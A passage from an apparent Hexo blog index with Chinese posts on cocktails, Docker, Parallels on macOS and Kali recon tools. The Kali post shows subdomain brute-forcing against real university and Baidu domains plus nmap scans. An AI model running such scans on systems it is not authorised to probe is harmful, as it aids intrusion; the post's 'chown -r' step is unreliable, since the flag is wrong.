      <tag>blog</tag>
      
      <tag>Hexo</tag>
      
      <tag>abbrlink</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Cocktail Formulas</title>
    <link href="/posts/56b5b661/"/>
    <url>/posts/56b5b661/</url>
    
    <content type="html"><![CDATA[<blockquote><p>《鸡尾酒法典》将所有Cocktail分为6种基本框架</p></blockquote><h3 id="Old-fashioned古典——烈酒-糖-苦精"><a href="#Old-fashioned古典——烈酒-糖-苦精" class="headerlink" title="Old fashioned古典——烈酒+糖+苦精"></a><code>Old fashioned古典</code>——烈酒+糖+苦精</h3><blockquote><p>甜+苦</p></blockquote><p>例：</p><ul><li><p>各种基底（威士忌、干邑、白酒等等）的old fashioned</p></li><li><p>萨泽拉克sazerac——黑麦威士忌+方糖+苦精+苦艾酒或Herbsaint</p></li><li><p>薄荷茱莉普Julep——威士忌、</p></li></ul><h3 id="Highball——烈酒-两份长饮成分"><a href="#Highball——烈酒-两份长饮成分" class="headerlink" title="Highball——烈酒+两份长饮成分"></a><code>Highball</code>——烈酒+两份长饮成分</h3><blockquote><p>简单易饮</p></blockquote><p>例：</p><p>金汤力——金酒+汤力水</p><p>帕洛玛Paloma——龙舌兰+西柚汁+西柚汤力</p><p>自由古巴——朗姆酒+可乐</p><p>大多数便利店调酒</p><h3 id="Daiquiri大吉利——烈酒-柑橘酸-糖浆"><a href="#Daiquiri大吉利——烈酒-柑橘酸-糖浆" class="headerlink" title="Daiquiri大吉利——烈酒+柑橘酸+糖浆"></a><code>Daiquiri大吉利</code>——烈酒+柑橘酸+糖浆</h3><blockquote><p>酸＋甜结构。更改基酒核心即可</p></blockquote><p>例：</p><p>Gimlet——金酒+柠檬汁+单糖浆</p><p>威士忌酸——调和威士忌+柠檬汁+单糖浆</p><h3 id="Side-car边车——烈酒-柑橘酸-利口酒"><a href="#Side-car边车——烈酒-柑橘酸-利口酒" class="headerlink" title="Side car边车——烈酒+柑橘酸+利口酒"></a><code>Side car边车</code>——烈酒+柑橘酸+利口酒</h3><blockquote><p>酸＋甜结构。与Daiquiri不同的是，甜的部分由利口酒提供。两种都可称为酸酒</p></blockquote><p>例：</p><p>White lady——金酒+柠檬汁+君度橙酒</p><p>玛格丽特——龙舌兰+青柠汁+君度橙酒+细盐</p><h3 id="Martini马天尼——烈酒-加香葡萄酒"><a href="#Martini马天尼——烈酒-加香葡萄酒" class="headerlink" title="Martini马天尼——烈酒+加香葡萄酒"></a><code>Martini马天尼</code>——烈酒+加香葡萄酒</h3><blockquote><p>伏特加底或金酒底常见，葡萄突出</p></blockquote><p>例：</p><p>曼哈顿——波本+甜味美思</p><p>Rob roy罗布罗伊——苏格兰威士忌+甜味美思+苦精 1滴</p><h3 id="Flip——烈酒-蛋-奶-糖"><a href="#Flip——烈酒-蛋-奶-糖" class="headerlink" title="Flip——烈酒+蛋/奶+糖"></a><code>Flip</code>——烈酒+蛋/奶+糖</h3><blockquote><p>蛋/奶比较突出</p></blockquote><p>例：</p><p>亚历山大——白兰地+淡奶油+利口酒+豆蔻粉</p><p>白俄罗斯——伏特加+奶油+咖啡糖浆</p><hr><blockquote><p>参考：</p><p><a href="https://www.bilibili.com/video/BV1uB4y1P7P1">https://www.bilibili.com/video/BV1uB4y1P7P1</a></p><p><a href="https://book.douban.com/subject/35197564/">《 鸡尾酒法典》</a>作者: 〔美〕亚历克斯·戴 / 〔美〕尼克·福查德 / 〔美〕大卫·卡普兰</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
      <category>微醺日记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Cocktail</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Kali信息收集工具</title>
    <link href="/posts/d163314c/"/>
    <url>/posts/d163314c/</url>
    
    <content type="html"><![CDATA[<h2 id="1-DNS枚举"><a href="#1-DNS枚举" class="headerlink" title="1. DNS枚举"></a>1. DNS枚举</h2><h3 id="1-1-DNSenum"><a href="#1-1-DNSenum" class="headerlink" title="1.1 DNSenum"></a>1.1 <code>DNSenum</code></h3><p><code>DNSenum</code>是一款非常强大的<strong>域名信息收集工具</strong>。它能够通过谷歌或者字典文件猜测可能存在的域名，并对一个网段进行反向查询。它不仅可以查询网站的主机地址信息、域名服务器和邮件交换记录，还可以在域名服务器上执行<code>axfr</code>请求，然后通过谷歌脚本得到扩展域名信息，提取子域名并查询，最后计算C类地址并执行<code>whois</code>查询，执行反向查询，把地址段写入文件。</p><ul><li><code>--threads [number]</code>：设置用户同时运行多个进程数。</li><li><code>-r</code>：允许用户启用递归查询。</li><li><code>-d</code>：允许用户设置WHOIS请求之间时间延迟数（单位为秒）。</li><li><code>-o</code>：允许用户指定输出位置。</li><li><code>-w</code>：允许用户启用WHOIS请求。</li></ul><p>示例：</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; dnsenum -f &#x2F;usr&#x2F;share&#x2F;dnsenum&#x2F;dns.txt hust.edu.cndnsenum VERSION:1.2.6-----   hust.edu.cn   -----Host&#39;s addresses:__________________hust.edu.cn.                             4502     IN    A        202.114.0.245Name Servers:______________dns1.hust.edu.cn.                        4502     IN    A        202.114.0.120dns2.hust.edu.cn.                        4502     IN    A        59.172.234.181······Brute forcing with &#x2F;usr&#x2F;share&#x2F;dnsenum&#x2F;dns.txt:_______________________________________________access.hust.edu.cn.                      4502     IN    A        210.42.109.207aco.hust.edu.cn.                         4502     IN    CNAME    zhanqun5.hust.edu.cn.zhanqun5.hust.edu.cn.                    4502     IN    A        210.42.108.5blog.hust.edu.cn.                        4502     IN    A        202.114.18.177······</code></pre></div><h3 id="1-2-fierce"><a href="#1-2-fierce" class="headerlink" title="1.2 fierce"></a>1.2 <code>fierce</code></h3><p><code>fierce</code>工具和<code>DNSenum</code>工具性质差不多，其<code>fierce</code>主要是<strong>对子域名进行扫描和收集信息</strong>的。使用<code>fierce</code>工具获取一个目标主机上所有IP地址和主机信息。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; fierce --domain baidu.comNS: ns3.baidu.com. ns7.baidu.com. dns.baidu.com. ns4.baidu.com. ns2.baidu.com.SOA: dns.baidu.com. (110.242.68.134)······Nearby:&#123;&#39;111.202.115.74&#39;: &#39;mx11.baidu.com.&#39;, &#39;111.202.115.75&#39;: &#39;mx10.baidu.com.&#39;&#125;Found: cache.baidu.com. (110.242.68.227)Found: cafe.baidu.com. (123.125.115.189)Found: cc.baidu.com. (112.34.111.153)Found: cdn.baidu.com. (10.169.43.10)······</code></pre></div><h3 id="1-3-Sublist3r"><a href="#1-3-Sublist3r" class="headerlink" title="1.3 Sublist3r"></a>1.3 <code>Sublist3r</code></h3><blockquote><p><a href="https://github.com/aboul3la/Sublist3r.git">https://github.com/aboul3la/Sublist3r.git</a></p></blockquote><p><code>Sublist3r</code>是一个<code>python</code>工具，旨在使用<code>OSINT</code><strong>枚举网站的子域</strong>。<code>Sublist3r</code>使用Google、Yahoo、Bing、百度和Ask等许多搜索引擎枚举子域。<code>Sublist3r</code>还使用Netcraft、Virustotal、ThreatCrowd、DNSdumpster和ReverseDNS来枚举子域名。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; python sublist3r.py -d hust.edu.cn                 ____        _     _ _     _   _____                &#x2F; ___| _   _| |__ | (_)___| |_|___ &#x2F; _ __                \___ \| | | | &#39;_ \| | &#x2F; __| __| |_ \| &#39;__|                 ___) | |_| | |_) | | \__ \ |_ ___) | |                |____&#x2F; \__,_|_.__&#x2F;|_|_|___&#x2F;\__|____&#x2F;|_|                # Coded By Ahmed Aboul-Ela - @aboul3la[-] Enumerating subdomains now for hust.edu.cn[-] Searching now in Baidu..[-] Searching now in Yahoo..[-] Searching now in Google..[-] Searching now in Bing..[-] Searching now in Ask..[-] Searching now in Netcraft..[-] Searching now in DNSdumpster..[-] Searching now in Virustotal..[-] Searching now in ThreatCrowd..[-] Searching now in SSL Certificates..[-] Searching now in PassiveDNS..[!] Error: Virustotal probably now is blocking our requests[-] Total Unique Subdomains Found: 150www.hust.edu.cnadmission.hust.edu.cnadvise.hust.edu.cnbcf.hust.edu.cnbiophy.hust.edu.cnblog.hust.edu.cnbyhh.hust.edu.cn······</code></pre></div><h2 id="2-测试网络范围"><a href="#2-测试网络范围" class="headerlink" title="2. 测试网络范围"></a>2. 测试网络范围</h2><h3 id="2-1-域名查询工具DMitry"><a href="#2-1-域名查询工具DMitry" class="headerlink" title="2.1 域名查询工具DMitry"></a>2.1 域名查询工具<code>DMitry</code></h3><p><code>DMitry</code>工具是用来<strong>查询IP或域名WHOIS信息</strong>的。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; dmitry -winsepo rzchina.netDeepmagic Information Gathering Tool&quot;There be some deep magic going on&quot;Writing output to &#39;rzchina.net.txt&#39;HostIP:180.178.61.83HostName:rzchina.net······Gathered Inic-whois information for rzchina.net---------------------------------   Domain Name: RZCHINA.NET   Registry Domain ID: 965877923_DOMAIN_NET-VRSN   Registrar WHOIS Server: whois.bizcn.com   Registrar URL: http:&#x2F;&#x2F;www.bizcn.com   Updated Date: 2020-05-10T07:17:45Z   Creation Date: 2007-05-09T10:08:08Z   Registry Expiry Date: 2021-05-09T10:08:08Z   Registrar: Bizcn.com, Inc.   Registrar IANA ID: 471   Registrar Abuse Contact Email:   Registrar Abuse Contact Phone:   Domain Status: clientDeleteProhibited https:&#x2F;&#x2F;icann.org&#x2F;epp#clientDeleteProhibited   Domain Status: clientTransferProhibited https:&#x2F;&#x2F;icann.org&#x2F;epp#clientTransferProhibited   Name Server: DNS1.BIZMOTO.COM   Name Server: DNS2.BIZMOTO.COM   DNSSEC: unsigned   URL of the ICANN Whois Inaccuracy Complaint Form: https:&#x2F;&#x2F;www.icann.org&#x2F;wicf&#x2F;&gt;&gt;&gt; Last update of whois database: 2021-03-29T13:11:07Z &lt;&lt;&lt;······</code></pre></div><h3 id="2-2-跟踪路由工具Scapy"><a href="#2-2-跟踪路由工具Scapy" class="headerlink" title="2.2 跟踪路由工具Scapy"></a>2.2 跟踪路由工具<code>Scapy</code></h3><p><code>Scapy</code>是一款强大的交互式数据包处理工具、数据包生成器、网络扫描器、网络发现工具和包嗅探工具。它提供多种类别的交互式生成数据包或数据包集合、对数据包进行操作、发送数据包、包嗅探、应答和反馈匹配等功能。</p><blockquote><p>内容较多。</p></blockquote><h2 id="3-nmap"><a href="#3-nmap" class="headerlink" title="3. nmap"></a>3. <code>nmap</code></h2><p><code>nmap</code>(network mapper)是一个用于网络发现和安全审计的免费开放源码(许可证)工具。</p><p>可用于<strong>主机发现，端口扫描，服务发现，操作系统</strong>。</p><h3 id="3-1-测试主机存活"><a href="#3-1-测试主机存活" class="headerlink" title="3.1 测试主机存活"></a>3.1 测试主机存活</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; nmap -sP 192.168.205.3Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-03-29 21:22 CSTNmap scan report for 192.168.205.3Host is up (0.00037s latency).MAC Address: 00:0C:29:75:81:24 (VMware)Nmap done: 1 IP address (1 host up) scanned in 0.25 seconds</code></pre></div><h3 id="3-2-查看打开端口"><a href="#3-2-查看打开端口" class="headerlink" title="3.2 查看打开端口"></a>3.2 查看打开端口</h3><p>直接传入ip地址即为扫描端口。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; nmap 192.168.205.3Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-03-29 21:26 CSTNmap scan report for 192.168.205.3Host is up (0.0011s latency).Not shown: 993 filtered portsPORT      STATE SERVICE135&#x2F;tcp   open  msrpc139&#x2F;tcp   open  netbios-ssn445&#x2F;tcp   open  microsoft-ds49153&#x2F;tcp open  unknown49154&#x2F;tcp open  unknown49155&#x2F;tcp open  unknown49157&#x2F;tcp open  unknownMAC Address: 00:0C:29:75:81:24 (VMware)Nmap done: 1 IP address (1 host up) scanned in 5.06 seconds</code></pre></div><p><code>-v</code> ：显示详细的扫描信息    </p><p><code>-sS</code> ：扫描方式-sS是使用SYN半开式扫描，这种扫描方式使得扫描结果更加正确(又称半开放，或隐身扫描)  </p><p><code>-oN/-oX/-oS/-oG &lt;file&gt;</code>: 输出为文件normal, XML, s|&lt;rIpt kIddi3, and Grepable format, respectively, to the given filename.<br><code>-sS/sT/sA/sW/sM</code>: TCP SYN/Connect()/ACK/Window/Maimon scans<br><code>-sU</code>: UDP Scan<br><code>-sN/sF/sX</code>: TCP Null, FIN, and Xmas scans</p><p><code>-sI</code> &lt;zombie host[:probeport]&gt;: Idle scan </p><p><code>-sY/sZ</code>: SCTP INIT/COOKIE-ECHO scans </p><p><code>-sO</code>: IP protocol scan<br><code>-b</code> <FTP relay host>: FTP bounce scan</FTP></p><p><code>-p</code>：指定端口或端口范围 -p 80-445。</p><h3 id="3-3-系统指纹识别"><a href="#3-3-系统指纹识别" class="headerlink" title="3.3 系统指纹识别"></a>3.3 系统指纹识别</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; nmap -O 192.168.205.3Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-03-29 21:32 CSTNmap scan report for 192.168.205.3Host is up (0.00083s latency).Not shown: 993 filtered portsPORT      STATE SERVICE135&#x2F;tcp   open  msrpc139&#x2F;tcp   open  netbios-ssn445&#x2F;tcp   open  microsoft-ds49153&#x2F;tcp open  unknown49154&#x2F;tcp open  unknown49155&#x2F;tcp open  unknown49157&#x2F;tcp open  unknownMAC Address: 00:0C:29:75:81:24 (VMware)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purpose|specialized|phoneRunning: Microsoft Windows 2008|8.1|7|Phone|VistaOS CPE: cpe:&#x2F;o:microsoft:windows_server_2008:r2 cpe:&#x2F;o:microsoft:windows_8.1 cpe:&#x2F;o:microsoft:windows_7::-:professional cpe:&#x2F;o:microsoft:windows_8 cpe:&#x2F;o:microsoft:windows_7 cpe:&#x2F;o:microsoft:windows cpe:&#x2F;o:microsoft:windows_vista::- cpe:&#x2F;o:microsoft:windows_vista::sp1OS details: Microsoft Windows Server 2008 R2 or Windows 8.1, Microsoft Windows 7 Professional or Windows 8, Microsoft Windows Embedded Standard 7, Microsoft Windows Phone 7.5 or 8.0, Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7, Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008Network Distance: 1 hopOS detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 6.62 seconds</code></pre></div><h4 id="指纹识别工具p0f"><a href="#指纹识别工具p0f" class="headerlink" title="指纹识别工具p0f"></a>指纹识别工具<code>p0f</code></h4><p>p0f是一款<strong>百分之百的<em>被动</em>指纹识别工具</strong>。该工具通过分析目标主机发出的数据包，对主机上的操作系统进行鉴别。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; p0f -r ~&#x2F;Desktop&#x2F;mac.pcapng -o result.log--- p0f 3.09b by Michal Zalewski &lt;lcamtuf@coredump.cx&gt; ---[+] Closed 1 file descriptor.[+] Loaded 322 signatures from &#39;&#x2F;etc&#x2F;p0f&#x2F;p0f.fp&#39;.[+] Will read pcap data from file &#39;&#x2F;root&#x2F;Desktop&#x2F;mac.pcapng&#39;.[+] Default packet filtering configured [+VLAN].[+] Log file &#39;result.log&#39; opened for writing.[+] Processing capture data..-[ 10.12.168.255&#x2F;55108 -&gt; 192.168.0.205&#x2F;59442 (syn) ]-|| client   &#x3D; 10.12.168.255&#x2F;55108| os       &#x3D; Mac OS X| dist     &#x3D; 0| params   &#x3D; generic fuzzy| raw_sig  &#x3D; 4:64+0:0:1460:65535,6:mss,nop,ws,nop,nop,ts,sok,eol+1:id-:0|&#96;----.-[ 10.12.168.255&#x2F;55108 -&gt; 192.168.0.205&#x2F;59442 (mtu) ]-|| client   &#x3D; 10.12.168.255&#x2F;55108| link     &#x3D; Ethernet or modem| raw_mtu  &#x3D; 1500|&#96;----All done. Processed 2535 packets.</code></pre></div><h3 id="3-4-服务指纹识别"><a href="#3-4-服务指纹识别" class="headerlink" title="3.4 服务指纹识别"></a>3.4 服务指纹识别</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; nmap -sV 192.168.205.3Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-03-29 21:42 CSTNmap scan report for 192.168.205.3Host is up (0.00100s latency).Not shown: 993 filtered portsPORT      STATE SERVICE      VERSION135&#x2F;tcp   open  msrpc        Microsoft Windows RPC139&#x2F;tcp   open  netbios-ssn  Microsoft Windows netbios-ssn445&#x2F;tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)49153&#x2F;tcp open  msrpc        Microsoft Windows RPC49154&#x2F;tcp open  msrpc        Microsoft Windows RPC49155&#x2F;tcp open  msrpc        Microsoft Windows RPC49157&#x2F;tcp open  msrpc        Microsoft Windows RPCMAC Address: 00:0C:29:75:81:24 (VMware)Service Info: Host: WIN-96S87FOPGPF; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windowsService detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 71.62 seconds</code></pre></div><h3 id="3-5-其他"><a href="#3-5-其他" class="headerlink" title="3.5 其他"></a>3.5 其他</h3><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -sP 172.16.15.0&#x2F;24nmap -sP 172.16.15.*# 列出开放了指定端口的主机列表  nmap -sT -p 80 -oG – 192.168.1.* | grep open# 获取远程主机的系统类型及开放端口  nmap -A &lt;target&gt;# 这里的 &lt; target &gt; 可以是单一 IP，或主机名，或域名，或子网 </code></pre></div><h2 id="4-其他信息收集"><a href="#4-其他信息收集" class="headerlink" title="4. 其他信息收集"></a>4. 其他信息收集</h2><h3 id="4-1-ARP侦查工具Netdiscover"><a href="#4-1-ARP侦查工具Netdiscover" class="headerlink" title="4.1 ARP侦查工具Netdiscover"></a>4.1 ARP侦查工具<code>Netdiscover</code></h3><p><code>Netdiscover</code>是一个主动/被动的<strong>ARP侦查工具</strong>。使用<code>Netdiscover</code>工具可以在网络上扫描IP地址，检查在线主机或搜索为它们发送的ARP请求。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">&gt; netdiscover Currently scanning: 172.16.24.0&#x2F;16   |   Screen View: Unique Hosts 2 Captured ARP Req&#x2F;Rep packets, from 2 hosts.   Total size: 120 _____________________________________________________________________________   IP            At MAC Address     Count     Len  MAC Vendor &#x2F; Hostname ----------------------------------------------------------------------------- 192.168.205.1   e2:b5:5f:2f:91:64      1      60  Unknown vendor 192.168.205.6   00:0c:29:74:c6:08      1      60  VMware, Inc.</code></pre></div><h3 id="4-2-搜索引擎工具Shodan"><a href="#4-2-搜索引擎工具Shodan" class="headerlink" title="4.2 搜索引擎工具Shodan"></a>4.2 搜索引擎工具<code>Shodan</code></h3><p><a href="https://www.shodan.io/">Shodan</a>是互联网上最强大的一个搜索引擎工具。该工具不是在网上搜索网址，而是直接<strong>搜索服务器</strong>。</p><hr><blockquote><p>参考：</p><p><a href="https://tools.kali.org/tools-listing">https://tools.kali.org/tools-listing</a></p><p><a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>项目组</category>
      
      <category>Kali</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Kali</tag>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Parallels虚拟机迁移问题记录</title>
    <link href="/posts/f99bebc2/"/>
    <url>/posts/f99bebc2/</url>
    
    <content type="html"><![CDATA[<blockquote><p>之前使用Mac上的Parallels安装Windows 10时，默认选择了<code>/var/root/Parallels</code>路径存放虚拟机文件。</p><p>而其他虚拟机文件在<code>/Users/buddyholly/Parallels</code>下。整体管理不方便，故选择将Windows 10迁移到Users下。</p></blockquote><h3 id="问题一：Finder文件夹不显示隐藏文件"><a href="#问题一：Finder文件夹不显示隐藏文件" class="headerlink" title="问题一：Finder文件夹不显示隐藏文件"></a>问题一：<code>Finder</code>文件夹不显示隐藏文件</h3><p>使用命令使隐藏文件在<code>Finder</code>中显示</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">defaults write com.apple.finder AppleShowAllFiles TRUE &amp;&amp; killall Finder</code></pre></div><p>若需要重新隐藏将<code>TRUE</code>写为<code>FALSE</code>即可。</p><p>为了省事可以写一个<code>alias</code>，使用<code>zsh</code>的话将以下内容写入<code>~/.zshrc</code>，立即生效需要<code>source</code>这个文件。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># aliasshowhidenfile&#x3D;&quot;defaults write com.apple.finder AppleShowAllFiles TRUE &amp;&amp; killall Finder&quot;notshowhidenfile&#x3D;&quot;defaults write com.apple.finder AppleShowAllFiles FALSE &amp;&amp; killall Finder&quot;</code></pre></div><h3 id="问题二：迁移Parallels虚拟机文件Windows-10-pvm"><a href="#问题二：迁移Parallels虚拟机文件Windows-10-pvm" class="headerlink" title="问题二：迁移Parallels虚拟机文件Windows 10.pvm"></a>问题二：迁移<code>Parallels</code>虚拟机文件<code>Windows 10.pvm</code></h3><p>我使用的方式是先克隆一个虚拟机，再将原虚拟机删除。</p><p>在<code>Parallels</code>中右键需要操作的虚拟机，选中<code>克隆</code>，可以选择克隆的目的路径与目标文件名（实际上pvm是个目录，包含了虚拟机所用的相关配置与文件）。我将了<code>/var/root/Parallels/Windows 10.pvm</code>克隆在了<code>/Users/buddyholly/Parallels/Windows 10.pvm</code>。</p><p>之后将<code>/var/root/Parallels/Windows 10.pvm</code>与<code>/var/root/Parallels/</code>下相关文件删除。这里我遇到了一个问题见<em>问题4</em>。</p><h3 id="问题三：克隆虚拟机的所有者与组"><a href="#问题三：克隆虚拟机的所有者与组" class="headerlink" title="问题三：克隆虚拟机的所有者与组"></a>问题三：克隆虚拟机的所有者与组</h3><p>因为原虚拟机文件在<code>/var/root</code>下，克隆至<code>/Users/buddyholly/Parallels/Windows 10.pvm</code>后仍为<code>root</code>的<code>own</code>与<code>group</code>。不变更的话操作不方便，而且显示新的pvm文件大小有误，但在电脑上肯定占用了空间。变更一下，变更后正常使用，文件大小显示正确。</p><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># 在&#x2F;Users&#x2F;buddyholly&#x2F;Parallels&#x2F;下进行# 两个操作都应选择递归-r，否则仍有错误sudo chown -r leex0 Windows 10.pvmsudo chgrp -r staff Windows 10.pvm</code></pre></div><h3 id="问题四：清理root下的-Trash"><a href="#问题四：清理root下的-Trash" class="headerlink" title="问题四：清理root下的.Trash"></a>问题四：清理root下的.Trash</h3><p>在解决<em>问题三</em>前，发现自己<strong>Mac的空间被其他类别占用很多</strong>，应该是虚拟机迁移的相关文件导致，搜了一下文件所在。发现<code>/var/root/.Trash</code>占用很大，应该是之前的操作不当导致垃圾箱有很多无用文件。</p><p>而在这里的垃圾文件不会被诸如CleanMyMac等软件扫描出来（可能是这些东西在/root下的原因）。手动删除一下<code>/var/root/.Trash</code>内的文件，再看Mac的存储空间，已经多出了应有的剩余空间。</p>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
      <category>Mac</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MacOS</tag>
      
      <tag>DNS</tag>
      
      <tag>Parallels</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker实践——Dockerfile指令</title>
    <link href="/posts/8ef91b9d/"/>
    <url>/posts/8ef91b9d/</url>
    
    <content type="html"><![CDATA[<blockquote><p><code>FROM</code>与<code>RUN</code>命令不再介绍，见<a href="https://leex0.top/2021/03/24/Docker%E5%AE%9E%E8%B7%B5%E2%80%94%E2%80%94%E6%9E%84%E5%BB%BA%E9%95%9C%E5%83%8F/">链接</a>。</p></blockquote><h2 id="COPY复制文件"><a href="#COPY复制文件" class="headerlink" title="COPY复制文件"></a>COPY复制文件</h2><p>格式：</p><ul><li><code>COPY [--chown=&lt;user&gt;:&lt;group&gt;] &lt;源路径&gt;... &lt;目标路径&gt;</code></li><li><code>COPY [--chown=&lt;user&gt;:&lt;group&gt;] [&quot;&lt;源路径1&gt;&quot;,... &quot;&lt;目标路径&gt;&quot;]</code></li></ul><p>和 <code>RUN</code> 指令一样，也有两种格式，一种类似于命令行，一种类似于函数调用。</p><p><code>COPY</code> 指令将从构建上下文目录中 <code>&lt;源路径&gt;</code> 的文件/目录复制到新的一层的镜像内的 <code>&lt;目标路径&gt;</code> 位置。比如：</p><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">COPY package.json &#x2F;usr&#x2F;src&#x2F;app&#x2F;</code></pre></div><p><code>&lt;源路径&gt;</code> 可以是多个，甚至可以是通配符，其通配符规则要满足 Go 的 <a href="https://golang.org/pkg/path/filepath/#Match"><code>filepath.Match</code></a> 规则，如：</p><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">COPY hom* &#x2F;mydir&#x2F;COPY hom?.txt &#x2F;mydir&#x2F;</code></pre></div><p><code>&lt;目标路径&gt;</code> 可以是容器内的绝对路径，也可以是相对于工作目录的相对路径（工作目录可以用 <code>WORKDIR</code> 指令来指定）。目标路径不需要事先创建，如果目录不存在会在复制文件前先行创建缺失目录。</p><p>此外，还需要注意一点，使用 <code>COPY</code> 指令，源文件的各种元数据都会保留。比如读、写、执行权限、文件变更时间等。这个特性对于镜像定制很有用。特别是构建相关文件都在使用 Git 进行管理的时候。</p><p>在使用该指令的时候还可以加上 <code>--chown=&lt;user&gt;:&lt;group&gt;</code> 选项来改变文件的所属用户及所属组。</p><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">COPY --chown&#x3D;55:mygroup files* &#x2F;mydir&#x2F;COPY --chown&#x3D;bin files* &#x2F;mydir&#x2F;COPY --chown&#x3D;1 files* &#x2F;mydir&#x2F;COPY --chown&#x3D;10:11 files* &#x2F;mydir&#x2F;</code></pre></div><p>如果源路径为文件夹，复制的时候不是直接复制该文件夹，而是将文件夹中的内容复制到目标路径。</p><h2 id="ADD-更高级的复制文件"><a href="#ADD-更高级的复制文件" class="headerlink" title="ADD 更高级的复制文件"></a>ADD 更高级的复制文件</h2><blockquote><p><strong>结论：此在 <code>COPY</code> 和 <code>ADD</code> 指令中选择的时候，可以遵循这样的原则，所有的文件复制均使用 <code>COPY</code> 指令，仅在需要自动解压缩的场合使用 <code>ADD</code>。</strong></p></blockquote><p><code>ADD</code> 指令和 <code>COPY</code> 的格式和性质基本一致。但是在 <code>COPY</code> 基础上增加了一些功能。</p><p>如果 <code>&lt;源路径&gt;</code> 为一个 <code>tar</code> 压缩文件的话，压缩格式为 <code>gzip</code>, <code>bzip2</code> 以及 <code>xz</code> 的情况下，<code>ADD</code> 指令将会自动解压缩这个压缩文件到 <code>&lt;目标路径&gt;</code> 去。</p><p>在某些情况下，这个自动解压缩的功能非常有用，比如官方镜像 <code>ubuntu</code> 中：</p><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM scratchADD ubuntu-xenial-core-cloudimg-amd64-root.tar.gz &#x2F;...</code></pre></div><h2 id="CMD-容器启动命令"><a href="#CMD-容器启动命令" class="headerlink" title="CMD 容器启动命令"></a>CMD 容器启动命令</h2><p><code>CMD</code> 指令的格式和 <code>RUN</code> 相似，也是两种格式：</p><ul><li><code>shell</code> 格式：<code>CMD &lt;命令&gt;</code></li><li><code>exec</code> 格式：<code>CMD [&quot;可执行文件&quot;, &quot;参数1&quot;, &quot;参数2&quot;...]</code></li><li>参数列表格式：<code>CMD [&quot;参数1&quot;, &quot;参数2&quot;...]</code>。在指定了 <code>ENTRYPOINT</code> 指令后，用 <code>CMD</code> 指定具体的参数。</li></ul><p><strong>之前介绍容器的时候曾经说过，Docker 不是虚拟机，容器就是进程。既然是进程，那么在启动容器的时候，需要指定所运行的程序及参数。<code>CMD</code> 指令就是用于指定默认的容器主进程的启动命令的。</strong></p><p>在运行时可以指定新的命令来替代镜像设置中的这个默认命令，比如，<code>ubuntu</code> 镜像默认的 <code>CMD</code> 是 <code>/bin/bash</code>，如果我们直接 <code>docker run -it ubuntu</code> 的话，会直接进入 <code>bash</code>。我们也可以在运行时指定运行别的命令，如 <code>docker run -it ubuntu cat /etc/os-release</code>。这就是用 <code>cat /etc/os-release</code> 命令替换了默认的 <code>/bin/bash</code> 命令了，输出了系统版本信息。</p><p>在指令格式上，一般推荐使用 <code>exec</code> 格式，这类格式在解析时会被解析为 JSON 数组，因此一定要使用双引号 <code>&quot;</code>，而不要使用单引号。</p><p>如果使用 <code>shell</code> 格式的话，实际的命令会被包装为 <code>sh -c</code> 的参数的形式进行执行。比如：</p><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">CMD echo $HOME</code></pre></div><p>在实际执行中，会将其变更为：</p><div class="code-wrapper"><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">CMD [ &quot;sh&quot;, &quot;-c&quot;, &quot;echo $HOME&quot; 